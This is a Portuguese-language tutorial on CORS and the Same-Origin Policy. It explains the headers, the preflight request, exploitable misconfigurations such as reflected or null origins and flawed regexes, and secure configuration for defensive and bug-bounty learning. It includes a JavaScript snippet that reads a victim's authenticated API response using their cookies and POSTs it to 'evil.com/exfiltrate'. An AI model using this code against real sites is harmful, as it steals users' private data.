CORS — Cross-Origin Resource Sharing

Same-Origin Policy e as excessões controladas que o CORS permite configurar.

A Same-Origin Policy é a regra fundamental de segurança dos browsers: um script em app.com não pode ler respostas de requisições feitas a api.outro.com. Origens são idênticas se compartilham protocolo + host + porta. CORS é o mecanismo que permite exceções controladas a essa regra.

https://app.com/ahttps://app.com/b SimProtocolo, host e porta iguais

https://app.comhttps://sub.app.com NãoHost diferente (subdomínio)
https://app.com:443https://app.com:8443 NãoPorta diferente

Headers CORS

# Requisição cross-origin (browser envia automaticamente):
GET /api/dados HTTP/1.1
Host: api.exemplo.com
Origin: https://app.exemplo.com

# Resposta do servidor (configuração correta):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.exemplo.com   ← origem específica
Access-Control-Allow-Credentials: true                  ← permite cookies
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization

# Para requests com metodos não-simples (PUT, DELETE, custom headers):
# Browser envia preflight (OPTIONS) antes:
OPTIONS /api/dados HTTP/1.1
Origin: https://app.exemplo.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

Misconfigurações Exploráveis

Wildcard + Credentials

# INVÁLIDO pelo padrão CORS (browsers rejeitam):
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# * não pode ser combinado com credentials
# Mas servidores podem aceitar erroneamente e vazar dados

Reflexão do Origin sem validação

# Servidor copia automaticamente o Origin da requisição:
# Requisição: Origin: https://evil.com
# Resposta: Access-Control-Allow-Origin: https://evil.com
# + Access-Control-Allow-Credentials: true
# → Atacante lê resposta autenticada da vítima!

Regex bypass de Origin

# Regex falho permite domínios não esperados:
# Padrão: /^https:\/\/.*\.exemplo\.com$/
# Bypass: https://evil.exemplo.com  ← subdomínio controlado
# Bypass: https://exemploXcom       ← sem escaped dot

Null Origin

# Origin: null é enviado por:
# - iframes sandboxed
# - arquivos locais (file://)
# Servidor que aceita null:
Access-Control-Allow-Origin: null
# Atacante usa iframe sandboxed para fazer requisição
# com Origin: null e ler a resposta

Exploração de CORS Vulnerável

// Atacante hospeda em evil.com — vítima visita a página:
<script>
fetch('https://api.alvo.com/dados-sensiveis', {
  credentials: 'include'  // envia cookies da vítima
})
.then(r => r.text())
.then(data => {
  // Exfiltra resposta (dados da vítima) para o servidor do atacante
  fetch('https://evil.com/exfiltrate', {
    method: 'POST',
    body: data
  });
});
</script>

// Para funcionar:
// 1. O servidor precisa ter Access-Control-Allow-Origin refletindo evil.com
// 2. Access-Control-Allow-Credentials: true precisa estar presente

Configuração Segura

Whitelist explícita de origens

Mantenha uma lista de origens permitidas e valide exatamente. Nunca use regex sem cuidado — prefira comparação exata string por string.

Evitar wildcard com dados sensíveis

Access-Control-Allow-Origin: * é aceitável para APIs públicas sem autenticação (ex: CDN). Nunca combine com Allow-Credentials: true.

Vary: Origin

Se o servidor reflete o Origin, deve incluir Vary: Origin para que intermediários (CDN/proxy) não cacheiem incorretamente respostas para origens diferentes.

Não confundir CORS com autenticação

CORS é uma política do browser — não autentica o servidor. Servidores devem validar tokens de autorização independentemente de qualquer configuração CORS.

CORS mal configurado é um achado frequente em bug bounty, especialmente em APIs internas expostas acidentalmente. Teste enviando origens falsas e verificando se o servidor reflete. Ferramentas como Burp Suite facilitam essa análise. Lembre-se: CORS protege o client-side reading de respostas — a requisição em si sempre chega ao servidor.

"CORS é um mecanismo de relaxamento da Same-Origin Policy — configure com precisão cirúrgica."
